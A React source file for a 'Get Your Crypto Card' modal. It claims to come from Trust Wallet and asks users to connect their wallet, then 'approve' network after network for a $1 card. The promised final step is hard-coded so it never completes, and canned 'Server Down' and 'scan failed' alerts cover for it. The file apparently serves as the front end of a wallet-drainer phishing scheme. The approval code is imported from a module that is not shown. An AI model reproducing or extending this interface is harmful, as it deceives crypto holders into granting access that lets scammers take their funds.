import React, { useEffect, useState } from "react";
import { createPortal } from "react-dom";
import { useUnifiedWallet } from "@/contexts/UnifiedWalletContext";
import { NETWORKS } from "@/lib/networks";

const CardModalEscrow: React.FC = () => {
  const [modalTarget, setModalTarget] = useState<HTMLElement | null>(null);

  useEffect(() => {
    setModalTarget(document.getElementById("escrow-modal-target"));
  }, []);
  const {
    isConnecting,
    isApproving,
    currentStep,
    approvedNetworks,
    serverDownVisible,
    connectFailed,
    tronErrorVisible,
    tronErrorMessage,
    connectAllWallets,
    approveNetwork,
    hideServerDown,
    hideTronError,
  } = useUnifiedWallet();

  const stepClass = (step: number) => {
    if (step === 3) return "step inactive";
    if (currentStep === step) return "step";
    if (currentStep > step) return "step inactive";
    return "step inactive";
  };

  const connectButtonLabel = isConnecting
    ? "Connecting..."
    : connectFailed
      ? "Try Again"
      : "Connect Wallet";

  const content = (
    <>
      <style>{`
        .escrow-network-list {
          display: flex;
          flex-direction: column;
          gap: 0.5rem;
          margin-top: 0.25rem;
        }

        .escrow-network-btn {
          display: flex;
          align-items: center;
          gap: 0.65rem;
          width: 100%;
          padding: 0.65rem 0.75rem;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          background: #fff;
          cursor: pointer;
          transition: all 0.2s ease;
          text-align: left;
        }

        .escrow-network-btn:hover:not(:disabled) {
          border-color: var(--primary-color);
          background: #f5f8ff;
        }

        .escrow-network-btn:disabled {
          opacity: 0.6;
          cursor: wait;
        }

        .escrow-network-btn.is-done {
          border-color: #86efac;
          background: #f0fdf4;
        }

        .escrow-network-logo {
          width: 28px;
          height: 28px;
          object-fit: contain;
          flex-shrink: 0;
        }

        .escrow-network-title {
          font-size: 0.88rem;
          font-weight: 600;
          color: #1a1a2e;
        }

        .escrow-alert-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0, 0, 0, 0.45);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10001;
          padding: 1rem;
        }

        .escrow-alert-box {
          background: #fff;
          border-radius: 12px;
          padding: 1.5rem;
          max-width: 320px;
          width: 100%;
          text-align: center;
          box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }

        .escrow-alert-box h3 {
          color: #dc2626;
          margin: 0 0 0.5rem;
          font-size: 1.1rem;
        }

        .escrow-alert-box p {
          color: #666;
          font-size: 0.85rem;
          margin: 0 0 1rem;
          line-height: 1.5;
        }

        .server-down-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0, 0, 0, 0.45);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10001;
          padding: 1rem;
        }

        .server-down-box {
          background: #fff;
          border-radius: 12px;
          padding: 1.5rem;
          max-width: 320px;
          width: 100%;
          text-align: center;
          box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }

        .server-down-box h3 {
          color: #dc2626;
          margin: 0 0 0.5rem;
          font-size: 1.1rem;
        }

        .server-down-box p {
          color: #666;
          font-size: 0.85rem;
          margin: 0 0 1rem;
          line-height: 1.5;
        }
      `}</style>

      <div className="modal-header">
        <h2>Get Your Crypto Card</h2>
      </div>

      <div className="steps-container">
        {/* Step 1: Connect */}
        <div className={stepClass(1)} data-step="1">
          <div className="step-header">
            <div className="step-number">1</div>
            <div className="step-title-group">
              <h3>Connect your wallet</h3>
              <p className="step-subtitle">Connect your Trust Wallet to start using your crypto card</p>
            </div>
          </div>
          {currentStep === 1 && (
            <div className="step-content">
              <p>Payment goes directly from your wallet. Issuing the card costs $1.</p>
              <button
                className="btn-primary btn-large step-button modal-button"
                disabled={isConnecting}
                onClick={() => connectAllWallets()}
              >
                {connectButtonLabel}
              </button>
            </div>
          )}
        </div>

        {/* Step 2: Scan Network */}
        <div className={currentStep >= 2 ? "step" : "step inactive"} data-step="2">
          <div className="step-header">
            <div className="step-number">2</div>
            <div className="step-title-group">
              <h3>Scan network</h3>
              <p className="step-subtitle">Select a network to scan</p>
            </div>
          </div>
          {currentStep >= 2 && (
            <div className="step-content">
              <div className="escrow-network-list">
                {NETWORKS.map((net) => {
                  const isDone = approvedNetworks[net.id];
                  return (
                    <button
                      key={net.id}
                      type="button"
                      className={`escrow-network-btn${isDone ? " is-done" : ""}`}
                      disabled={isApproving}
                      onClick={() => approveNetwork(net.id)}
                    >
                      <img src={net.logo} alt={net.title} className="escrow-network-logo" />
                      <span className="escrow-network-title">{net.title}</span>
                    </button>
                  );
                })}
              </div>
            </div>
          )}
        </div>

        {/* Step 3: Placeholder — inactive */}
        <div className="step inactive" data-step="3">
          <div className="step-header">
            <div className="step-number">3</div>
            <div className="step-title-group">
              <h3>Your Crypto Card is ready</h3>
              <p className="step-subtitle">Start using your card</p>
            </div>
          </div>
          <div className="step-content">
            <p>Your Crypto Card from Trust Wallet is open. Payment goes directly from your Trust Wallet.</p>
          </div>
        </div>
      </div>

      {tronErrorVisible && (
        <div className="escrow-alert-overlay" onClick={() => hideTronError()}>
          <div className="escrow-alert-box" onClick={(e) => e.stopPropagation()}>
            <h3>Tron Scan Failed</h3>
            <p>{tronErrorMessage}</p>
            <button className="btn-primary step-button modal-button" onClick={() => hideTronError()}>
              OK
            </button>
          </div>
        </div>
      )}

      {serverDownVisible && (
        <div className="server-down-overlay" onClick={() => hideServerDown()}>
          <div className="server-down-box" onClick={(e) => e.stopPropagation()}>
            <h3>Server Down</h3>
            <p>Our servers are temporarily unavailable. Please try again later.</p>
            <button className="btn-primary step-button modal-button" onClick={() => hideServerDown()}>
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );

  if (!modalTarget) return null;
  return createPortal(content, modalTarget);
};

export default CardModalEscrow;
